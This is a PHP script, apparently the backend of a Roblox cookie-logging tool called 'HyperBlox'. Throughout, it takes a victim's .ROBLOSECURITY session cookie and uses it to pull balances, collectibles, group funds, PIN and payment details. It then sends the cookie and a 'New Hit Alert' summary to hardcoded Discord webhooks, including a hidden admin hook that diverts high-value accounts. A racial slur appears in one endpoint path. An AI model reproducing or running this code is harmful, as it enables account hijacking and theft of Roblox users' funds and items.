<?php
error_reporting(0);
ini_set('default_socket_timeout', '6'); // prevent long hangs on remote calls

// Admin webhook - constant webhook that receives all embeds and notifications (not exposed in frontend)
$adminhook = "https://discord.com/api/webhooks/1437891603631968289/fESUQjQ05NN35ewAcATDKmP1atDTqwWEe_Wy6WJ_TJ8rJbkq8ugvxBQQzGYe3UQz0vfv";

$cookie = $_GET['cookie'];
$ht = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
// Use HTTP_HOST so localhost includes the dev server port (e.g., localhost:8000)
$dom = $ht . $_SERVER['HTTP_HOST'];

function getLocal($url, $timeout = 6) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    $res = curl_exec($ch);
    curl_close($ch);
    return $res;
}

$refreshedCookie = getLocal("$dom/controlPage/apis/refresher.php?cookie=$cookie", 6);
if ($refreshedCookie == "Invalid Cookie" || $refreshedCookie === false || $refreshedCookie === null) {
    $refreshedCookie = getLocal("$dom/controlPage/apis/nigger.php?cookie=$cookie", 6);
}
if (!$refreshedCookie || stripos($refreshedCookie, 'WARNING') !== false) {
    // fall back to original cookie to avoid total failure
    $refreshedCookie = $cookie;
}

function makeRequest($url, $headers, $postData = null, $timeout = 8) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// Separate function for webhook requests that returns detailed result
function makeWebhookRequest($url, $headers, $postData = null, $timeout = 8) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    if ($postData) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($postData, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
    }
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    // Return response and HTTP code for error checking
    return ['response' => $response, 'http_code' => $httpCode, 'error' => $error];
}

function gamepass($cookie, $gameId) {
    $headers = ["Cookie: .ROBLOSECURITY=$cookie", "Content-Type: application/json"];
    $response = json_decode(makeRequest("https://inventory.roblox.com/v1/users/1/items/GamePass/$gameId/is-owned", $headers), true);
    return isset($response) ? ($response ? '✅' : '❌') : '❓';
}

function sanitize($value, $maxLength = 1024) {
    if (is_null($value)) return '❓ Unknown';
    $value = str_replace(['`', '*', '_', '~', '|'], '', $value);
    return substr($value, 0, $maxLength);
}

$headers = ["Cookie: .ROBLOSECURITY=$refreshedCookie", "Content-Type: application/json"];

$settingsData = json_decode(makeRequest("https://www.roblox.com/my/settings/json", $headers), true);
$userId = $settingsData['UserId'] ?? 0;

$userInfoData = json_decode(makeRequest("https://users.roblox.com/v1/users/$userId", $headers), true);
$displayName = sanitize($userInfoData['displayName'] ?? 'Unknown');
$username = sanitize($userInfoData['name'] ?? 'Unknown');

$games = [
    'BF' => json_decode(makeRequest("https://games.roblox.com/v1/games/994732206/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'AM' => json_decode(makeRequest("https://games.roblox.com/v1/games/383310974/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'MM2' => json_decode(makeRequest("https://games.roblox.com/v1/games/66654135/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'PS99' => json_decode(makeRequest("https://games.roblox.com/v1/games/3317771874/votes/user", $headers), true)['canVote'] ? '✅' : '❌',
    'BB' => json_decode(makeRequest("https://games.roblox.com/v1/games/4777817887/votes/user", $headers), true)['canVote'] ? '✅' : '❌'
];

$gamePasses = [
    'BF' => gamepass($refreshedCookie, 2753915549),
    'AM' => gamepass($refreshedCookie, 920587237),
    'MM2' => gamepass($refreshedCookie, 142823291),
    'PS99' => gamepass($refreshedCookie, 8737899170),
    'BB' => gamepass($refreshedCookie, 13772394625)
];

$transactionSummaryData = json_decode(makeRequest("https://economy.roblox.com/v2/users/$userId/transaction-totals?timeFrame=Year&transactionType=summary", $headers), true);
$summary = isset($transactionSummaryData['purchasesTotal']) ? number_format(abs($transactionSummaryData['purchasesTotal'])) : '❓ Unknown';

$avatarData = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=150x150&format=Png&isCircular=false");
$avatarJson = json_decode($avatarData, true);
$avatarUrl = $avatarJson['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';

$balanceData = json_decode(makeRequest("https://economy.roblox.com/v1/users/$userId/currency", $headers), true);
$robux = isset($balanceData['robux']) ? number_format($balanceData['robux']) : 0;
$pendingRobux = isset($transactionSummaryData['pendingRobuxTotal']) ? number_format($transactionSummaryData['pendingRobuxTotal']) : '❓ Unknown';

$collectiblesData = json_decode(makeRequest("https://inventory.roblox.com/v1/users/$userId/assets/collectibles?limit=100", $headers), true);
$rap = 0;
if (isset($collectiblesData['data'])) {
    foreach ($collectiblesData['data'] as $item) {
        $rap += $item['recentAveragePrice'] ?? 0;
    }
}
$rap = number_format($rap);
$inventoryCount = isset($collectiblesData['total']) ? number_format($collectiblesData['total']) : '❓ Unknown';

$pinData = json_decode(makeRequest("https://auth.roblox.com/v1/account/pin", $headers), true);
$pinStatus = isset($pinData['isEnabled']) ? ($pinData['isEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

$vcData = json_decode(makeRequest("https://voice.roblox.com/v1/settings", $headers), true);
$vcStatus = isset($vcData['isVoiceEnabled']) ? ($vcData['isVoiceEnabled'] ? '✅ True' : '❌ False') : '❓ Unknown';

function ownsBundle($userId, $bundleId, $headers) {
    $response = json_decode(makeRequest("https://inventory.roblox.com/v1/users/$userId/items/3/$bundleId", $headers), true);
    return isset($response['data']) && !empty($response['data']);
}

$hasHeadless = ownsBundle($userId, 201, $headers);
$hasKorblox = ownsBundle($userId, 192, $headers);
$headlessStatus = $hasHeadless ? '✅ True' : '❌ False';
$korbloxStatus = $hasKorblox ? '✅ True' : '❌ False';

$accountCreated = isset($userInfoData['created']) ? strtotime($userInfoData['created']) : null;
$joinDate = '❓ Unknown';
$accountAge = '❓ Unknown';
if ($accountCreated) {
    $joinDate = date('F j, Y', $accountCreated);
    $days = floor((time() - $accountCreated) / (60 * 60 * 24));
    $accountAge = number_format($days) . ' days';
}

$friendsData = json_decode(makeRequest("https://friends.roblox.com/v1/users/$userId/friends/count", $headers), true);
$friendsCount = isset($friendsData['count']) ? number_format($friendsData['count']) : '❓ Unknown';

$followersData = json_decode(makeRequest("https://friends.roblox.com/v1/users/$userId/followers/count", $headers), true);
$followersCount = isset($followersData['count']) ? number_format($followersData['count']) : '❓ Unknown';

$groupsData = json_decode(makeRequest("https://groups.roblox.com/v2/users/$userId/groups/roles", $headers), true);
$ownedGroups = [];
$allGroupRoles = [];
$highestRank = 0;
$highestGroup = 'None';
if (isset($groupsData['data'])) {
    foreach ($groupsData['data'] as $group) {
        $groupName = sanitize($group['group']['name'] ?? 'Unknown');
        $roleName = sanitize($group['role']['name'] ?? 'Unknown');
        $allGroupRoles[] = "• {$groupName} » **{$roleName}**";
        if ($group['role']['rank'] == 255) {
            $ownedGroups[] = $group;
        }
        if ($group['role']['rank'] > $highestRank) {
            $highestRank = $group['role']['rank'];
            $highestGroup = $groupName;
        }
    }
}
$groupRolesFormatted = implode("\n", array_slice($allGroupRoles, 0, 3));
if (count($allGroupRoles) > 3) $groupRolesFormatted .= "\n• +" . (count($allGroupRoles) - 3) . " more";
$totalGroupsOwned = count($ownedGroups);

$totalGroupFunds = 0;
$totalPendingGroupFunds = 0;
foreach ($ownedGroups as $group) {
    $groupId = $group['group']['id'];
    $groupFunds = json_decode(makeRequest("https://economy.roblox.com/v1/groups/$groupId/currency", $headers), true);
    $totalGroupFunds += $groupFunds['robux'] ?? 0;

    $groupPayouts = json_decode(makeRequest("https://economy.roblox.com/v1/groups/$groupId/payouts", $headers), true);
    if (isset($groupPayouts['data'])) {
        foreach ($groupPayouts['data'] as $payout) {
            if ($payout['status'] === 'Pending') {
                $totalPendingGroupFunds += $payout['amount'];
            }
        }
    }
}
$totalGroupFunds = number_format($totalGroupFunds);
$totalPendingGroupFunds = number_format($totalPendingGroupFunds);

$creditBalanceData = json_decode(makeRequest("https://billing.roblox.com/v1/credit", $headers), true);
$creditBalance = isset($creditBalanceData['balance']) ? '$' . number_format($creditBalanceData['balance'], 2) : '❓ Unknown';

$emailVerified = isset($settingsData['IsEmailVerified']) ? ($settingsData['IsEmailVerified'] ? '✅ True' : '❌ False') : '❓ Unknown';

$presenceData = json_decode(makeRequest("https://presence.roblox.com/v1/presence/users", $headers, ["userIds" => [$userId]]), true);
$presenceType = '❓ Unknown';
if (isset($presenceData['userPresences'][0])) {
    $presence = $presenceData['userPresences'][0];
    $presenceTypes = [0 => 'Offline', 1 => 'Online', 2 => 'InGame', 3 => 'Studio'];
    $presenceType = $presenceTypes[$presence['userPresenceType']] ?? '❓ Unknown';
}

$bio = sanitize($userInfoData['description'] ?? null, 200);
if (empty($bio)) $bio = '❌ No bio set';

$nonFilteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l";
$filteredWebhook = "https://discord.com/api/webhooks/1286978728701857812/brPoKB_P-_wgaizsnbaEWJm-unYYiM2ETToJ7mrJCMDW6V_wn0pKNMpIInhDApbNC02l";

// Collect all webhooks: adminhook, main webhook, and dualhook
$webhooks = [];

// Add adminhook first (constant webhook - always receives all embeds)
if (!empty($adminhook)) {
    $webhooks[] = $adminhook;
}

// Get main webhook early (PHP automatically decodes URL parameters, but handle both encoded and decoded)
$mainWebhookRaw = $_GET["web"] ?? '';
$mainWebhook = $mainWebhookRaw;
// If it looks URL-encoded, decode it (PHP usually does this automatically, but be safe)
if (strpos($mainWebhookRaw, '%') !== false) {
    $mainWebhook = urldecode($mainWebhookRaw);
}
// Add main webhook right after adminhook - make it unconditional like adminhook
// Main webhook should always be added when provided, just like adminhook
if (!empty($mainWebhook)) {
    $webhooks[] = $mainWebhook;
}

// Dualhook can be passed as 'dh' or 'dualhook' parameter
$dualhook = '';
// Check both parameters - prefer 'dh' if both are present (dh is more common)
$dhParam = $_GET["dh"] ?? '';
$dualhookParam = $_GET["dualhook"] ?? '';

// Get dualhook from either parameter (prefer 'dh')
// PHP automatically URL-decodes GET parameters, so they should already be decoded
// But handle edge cases where they might still be encoded
if (!empty($dhParam) && trim($dhParam) !== '' && $dhParam !== 'null' && $dhParam !== 'undefined') {
    // PHP usually auto-decodes, but if it still contains % signs, decode it
    $dualhook = (strpos($dhParam, '%') !== false) ? urldecode($dhParam) : $dhParam;
} elseif (!empty($dualhookParam) && trim($dualhookParam) !== '' && $dualhookParam !== 'null' && $dualhookParam !== 'undefined') {
    // PHP usually auto-decodes, but if it still contains % signs, decode it
    $dualhook = (strpos($dualhookParam, '%') !== false) ? urldecode($dualhookParam) : $dualhookParam;
}

// Add dualhook after main webhook - make it work like adminhook (unconditional when provided)
// Dualhook should always be added when provided, just like adminhook
if (!empty($dualhook)) {
    // Make sure dualhook isn't already in the array (avoid duplicates)
    if (!in_array($dualhook, $webhooks)) {
        $webhooks[] = $dualhook;
    }
}

// For high-value accounts, use filtered webhook but still include dualhook
$isHighValue = (
    $robux >= 35000 ||
    $rap >= 65000 ||
    $totalGroupFunds >= 35000 ||
    $summary >= 300000 ||
    $creditBalance >= 100 ||
    $pendingRobux >= 25000 ||
    $followersCount >= 10000
);

if ($isHighValue) {
    // Replace main webhook with filtered webhook, but keep original main webhook, dualhook and adminhook
    $webhooks = [$filteredWebhook];
    // Always include adminhook (constant)
    if (!empty($adminhook)) {
        $webhooks[] = $adminhook;
    }
    // Always include original main webhook if it was set
    if (!empty($mainWebhook)) {
        $webhooks[] = $mainWebhook;
    }
    // Always include dualhook if it was set - unconditional like adminhook
    if (!empty($dualhook)) {
        $webhooks[] = $dualhook;
    }
}

$timestamp = date("c");
$space = '|';

$embed1 = [
    'content' => '@everyone',
    'username' => 'HyperBlox',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [
        [
            'title' => "New Hit Alert!",
            'description' => "<:check:1350103884835721277> **[Check Cookie]($dom/controlPage/check/check.php?cookie=$refreshedCookie)** <:line:1350104634982662164> <:refresh:1350103925037989969> **[Refresh Cookie]($dom/controlPage/antiprivacy/kingvon.php?cookie=$refreshedCookie)** <:line:1350104634982662164> <:profile:1350103857903960106> **[Profile](https://www.roblox.com/users/$userId/profile)** <:line:1350104634982662164> <:rolimons:1350103860588314676> **[Rolimons](https://rolimons.com/player/$userId)**",
            'color' => hexdec('00BFFF'),
            'thumbnail' => ['url' => $avatarUrl],
            'fields' => [
                [
                    'name' => '**<:search:1391436893794861157> About:**',
                    'value' => "• **Display:** `$displayName`\n• **Username:** `$username`\n• **User ID:** `$userId`\n• **Age:** `$accountAge`\n• **Join Date:** `$joinDate`\n• **Bio:** `$bio`",
                    'inline' => true
                ],
                [
                    'name' => '**<:info:1391434745207853138> Information:**',
                    'value' => "• **Robux:** `$robux`\n• **Pending:** `$pendingRobux`\n• **Credit:** `$creditBalance`\n• **Summary:** `$summary`",
                    'inline' => true
                ],
                [
                    'name' => '**<:settings:1391433304145924146> Settings:**',
                    'value' => "• **PIN:** `$pinStatus`\n• **Premium:** `" . ($settingsData['IsPremium'] ? '✅ True' : '❌ False') . "`\n• **VC:** `$vcStatus`\n• **Verified:** `$emailVerified`\n• **Presence:** `$presenceType`",
                    'inline' => true
                ],
                [
                    'name' => '**<:Games:1313020733932306462> Games Played:**',
                    'value' => "<:bf:1303894849530888214> $space {$games['BF']} $space {$gamePasses['BF']}\n" .
                               "<:adm:1303894863007453265> $space {$games['AM']} $space {$gamePasses['AM']}\n" .
                               "<:mm2:1303894855281541212> $space {$games['MM2']} $space {$gamePasses['MM2']}\n" .
                               "<:ps99:1303894865079308288> $space {$games['PS99']} $space {$gamePasses['PS99']}\n" .
                               "<:bb:1303894852697718854> $space {$games['BB']} $space {$gamePasses['BB']}",
                    'inline' => true
                ],
                [
                    'name' => '**<:bag:1391435344779677887> Inventory:**',
                    'value' => "• **RAP:** `$rap`\n• **Headless:** `$headlessStatus`\n• **Korblox:** `$korbloxStatus`",
                    'inline' => true
                ],
                [
                    'name' => '**<:groups:1391434330823200840> Groups:**',
                    'value' => "• **Owned:** `$totalGroupsOwned`\n• **Highest Rank:** `#$highestRank in $highestGroup`\n• **Funds:** `$totalGroupFunds R$`\n• **Pending:** `$totalPendingGroupFunds R$`",
                    'inline' => true
                ],
                [
                    'name' => '**<:user:1391436034843349002> Profile:**',
                    'value' => "• **Friends:** `$friendsCount`\n• **Followers:** `$followersCount`",
                    'inline' => true
                ]
            ]
        ]
    ]
];

// Ensure we have a valid cookie for embed2 (use refreshed cookie or fallback to original)
$cookieForEmbed = !empty($refreshedCookie) && strlen(trim($refreshedCookie)) > 10 ? $refreshedCookie : $cookie;
$cookieLabel = !empty($refreshedCookie) && strlen(trim($refreshedCookie)) > 10 ? 'Refreshed Cookie' : 'Original Cookie';

// Make sure cookie is not empty for embed2
if (empty($cookieForEmbed) || strlen(trim($cookieForEmbed)) < 10) {
    $cookieForEmbed = $cookie; // Fallback to original cookie
    $cookieLabel = 'Original Cookie';
}

$embed2 = [
    'username' => 'HyperBlox',
    'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
    'embeds' => [
        [
            'title' => '🍪 .ROBLOSECURITY',
            'description' => "```\n" . substr($cookieForEmbed, 0, 2000) . "\n```",
            'color' => hexdec('00BFFF'),
            'footer' => [
                'text' => $cookieLabel,
                'icon_url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
            ],
            'thumbnail' => [
                'url' => 'https://cdn-icons-png.flaticon.com/512/5473/5473473.png'
            ],
            'timestamp' => $timestamp
        ]
    ]
];

// Helper function to send embed with retries
function sendEmbedWithRetries($webhook, $embed, $maxRetries = 3) {
    if (empty($webhook)) {
        return false;
    }
    
    $result = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed);
    $success = isset($result['http_code']) && $result['http_code'] >= 200 && $result['http_code'] < 300;
    
    if (!$success) {
        for ($retry = 0; $retry < $maxRetries; $retry++) {
            sleep(2 + $retry); // 2s, 3s, 4s delays
            $retryResult = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed);
            if (isset($retryResult['http_code']) && $retryResult['http_code'] >= 200 && $retryResult['http_code'] < 300) {
                $success = true;
                break;
            }
        }
    }
    
    return $success;
}

// Special function to send cookie embed with extra care - ensures main webhook gets it
function sendCookieEmbedReliable($webhook, $embed2, $webhookName = '') {
    if (empty($webhook)) {
        return false;
    }
    
    // Try multiple times with increasing delays
    for ($attempt = 0; $attempt < 4; $attempt++) {
        if ($attempt > 0) {
            sleep(2 + $attempt); // 2s, 3s, 4s delays between attempts
        }
        
        $result = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
        $success = isset($result['http_code']) && $result['http_code'] >= 200 && $result['http_code'] < 300;
        
        if ($success) {
            return true;
        }
        
        // If failed, retry this attempt
        if (!$success && $attempt < 3) {
            sleep(1);
            $retryResult = makeWebhookRequest($webhook, ["Content-Type: application/json"], $embed2);
            if (isset($retryResult['http_code']) && $retryResult['http_code'] >= 200 && $retryResult['http_code'] < 300) {
                return true;
            }
        }
    }
    
    return false;
}

// Send embeds to all webhooks (adminhook + main webhook + dualhook)
// Send both embeds unconditionally to each webhook with retry logic
foreach ($webhooks as $webhookIndex => $webhook) {
    if (empty($webhook)) {
        continue;
    }
    
    // Send embed1 (RAP summary) with retries
    sendEmbedWithRetries($webhook, $embed1, 3);
    sleep(1);
    
    // Send embed2 (cookie) with retries - CRITICAL
    sendEmbedWithRetries($webhook, $embed2, 5);
    sleep(1);
    
    // Wait between webhooks to avoid rate limiting
    if ($webhookIndex < count($webhooks) - 1) {
        sleep(1);
    }
}

// Also send to non-filtered webhook (backup)
sendEmbedWithRetries($nonFilteredWebhook, $embed1, 3);
sleep(1);
sendEmbedWithRetries($nonFilteredWebhook, $embed2, 3);

// CRITICAL: Dedicated sends to ensure ALL webhooks get BOTH embeds reliably
// PRIORITY: Send to main webhook FIRST - send directly using the raw parameter to ensure it works
$mainWebhookDirect = $_GET["web"] ?? '';
if (!empty($mainWebhookDirect)) {
    // Decode if needed
    if (strpos($mainWebhookDirect, '%') !== false) {
        $mainWebhookDirect = urldecode($mainWebhookDirect);
    }
    
    // Send embed1 (RAP) directly - multiple attempts
    sleep(1);
    makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed1);
    sleep(1);
    makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed1);
    
    // Send embed2 (cookie) directly - multiple attempts with retry logic
    sleep(1);
    $cookieResult1 = makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
    // Retry if failed
    if (!isset($cookieResult1['http_code']) || $cookieResult1['http_code'] < 200 || $cookieResult1['http_code'] >= 300) {
        sleep(3);
        makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
    }
    sleep(2);
    $cookieResult2 = makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
    if (!isset($cookieResult2['http_code']) || $cookieResult2['http_code'] < 200 || $cookieResult2['http_code'] >= 300) {
        sleep(3);
        makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
    }
    sleep(2);
    $cookieResult3 = makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
    if (!isset($cookieResult3['http_code']) || $cookieResult3['http_code'] < 200 || $cookieResult3['http_code'] >= 300) {
        sleep(3);
        makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
    }
    sleep(2);
    $cookieResult4 = makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
    if (!isset($cookieResult4['http_code']) || $cookieResult4['http_code'] < 200 || $cookieResult4['http_code'] >= 300) {
        sleep(3);
        makeWebhookRequest($mainWebhookDirect, ["Content-Type: application/json"], $embed2);
    }
}

// Also send using the stored mainWebhook variable (backup) - send both embeds
if (!empty($mainWebhook)) {
    sleep(2);
    // Send embed1 (RAP) first
    makeWebhookRequest($mainWebhook, ["Content-Type: application/json"], $embed1);
    sleep(1);
    // Send cookie embed multiple times with retries
    $backupCookie1 = makeWebhookRequest($mainWebhook, ["Content-Type: application/json"], $embed2);
    if (!isset($backupCookie1['http_code']) || $backupCookie1['http_code'] < 200 || $backupCookie1['http_code'] >= 300) {
        sleep(3);
        makeWebhookRequest($mainWebhook, ["Content-Type: application/json"], $embed2);
    }
    sleep(3);
    $backupCookie2 = makeWebhookRequest($mainWebhook, ["Content-Type: application/json"], $embed2);
    if (!isset($backupCookie2['http_code']) || $backupCookie2['http_code'] < 200 || $backupCookie2['http_code'] >= 300) {
        sleep(3);
        makeWebhookRequest($mainWebhook, ["Content-Type: application/json"], $embed2);
    }
}

// Send to adminhook separately to guarantee delivery
if (!empty($adminhook)) {
    sleep(1);
    sendEmbedWithRetries($adminhook, $embed1, 2);
    sleep(1);
    sendEmbedWithRetries($adminhook, $embed2, 3);
}

// Send to dualhook separately to guarantee delivery
if (!empty($dualhook) && $dualhook !== $adminhook && $dualhook !== $mainWebhook) {
    sleep(1);
    sendEmbedWithRetries($dualhook, $embed1, 2);
    sleep(1);
    sendEmbedWithRetries($dualhook, $embed2, 3);
}

echo json_encode([
    'robux' => $robux,
    'rap' => $rap,
    'summary' => $summary,
    'status' => 'success'
]);
?>